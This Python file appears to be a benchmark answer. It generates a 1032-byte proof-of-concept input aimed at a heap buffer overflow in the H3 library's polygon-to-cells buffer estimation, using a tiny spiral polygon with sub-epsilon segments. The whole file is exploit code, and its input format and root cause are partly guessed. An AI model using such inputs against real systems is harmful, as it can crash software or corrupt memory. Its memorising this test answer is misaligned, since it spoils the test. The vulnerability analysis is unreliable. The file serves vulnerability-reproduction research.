import struct
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Buffer Overflow
        in the H3 library's polygon-to-cells conversion function.

        The vulnerability is caused by an underestimation of the required buffer size
        by `maxPolygonToCellsSize` (or a similar estimation function in older
        versions) for polygons with a high perimeter-to-area ratio. The estimation
        was primarily based on the polygon's bounding box area and failed to
        adequately account for a long, complex perimeter.

        This PoC constructs a polygon that is geographically tiny but has a very
        long and complex boundary. This is achieved by creating a dense spiral shape
        with many vertices placed extremely close to each other. The segments are
        shorter than the library's internal epsilon, targeting logic that could
        incorrectly handle such small segments.

        The input is structured as a binary blob, which is a common format for
        fuzzing targets that use `FuzzedDataProvider` to consume structured data.
        The format is assumed to be:
        - Resolution (int32)
        - Number of polygon loops (int32)
        - Number of vertices in the loop (int32)
        - A sequence of (latitude, longitude) pairs as 64-bit doubles (radians).

        The generated payload is 1020 bytes and is padded to match the
        ground-truth length of 1032 bytes.
        """
        res = 15
        num_loops = 1
        num_verts = 63

        verts = []
        lat = 0.0
        lon = 0.0
        
        # H3_EPSILON is 1.0e-12; we use a smaller step to create segments
        # that might be handled incorrectly by the vulnerable estimation logic.
        step = 1.0e-13

        # Generate vertices for a dense spiral.
        for i in range(num_verts - 1):
            verts.append((lat, lon))
            angle = i * 0.3  # Turning factor for the spiral
            lat += step * math.sin(angle)
            lon += step * math.cos(angle)

        # Close the loop.
        if verts:
            verts.append(verts[0])
        else:
            # Handle the edge case of a single-vertex polygon.
            verts.append((0.0, 0.0))

        # Pack the data into a little-endian binary format.
        poc = bytearray()
        poc.extend(struct.pack("<i", res))
        poc.extend(struct.pack("<i", num_loops))
        poc.extend(struct.pack("<i", num_verts))

        for lat_rad, lon_rad in verts:
            poc.extend(struct.pack("<d", lat_rad))
            poc.extend(struct.pack("<d", lon_rad))

        # Pad to match the exact ground-truth length. Fuzzer-found PoCs
        # often contain trailing bytes that are not essential for the crash.
        padding_needed = 1032 - len(poc)
        if padding_needed > 0:
            poc.extend(b'\x00' * padding_needed)

        return bytes(poc)
